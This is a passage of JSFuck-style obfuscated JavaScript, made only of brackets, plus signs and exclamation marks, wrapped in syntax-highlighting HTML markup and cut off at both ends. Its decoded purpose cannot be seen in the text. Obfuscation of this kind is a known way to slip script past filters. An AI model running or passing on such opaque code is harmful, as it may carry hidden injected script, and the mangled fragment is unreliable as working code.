class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>((!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)()(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>((+((+(+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>)+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>)+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)()())<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span 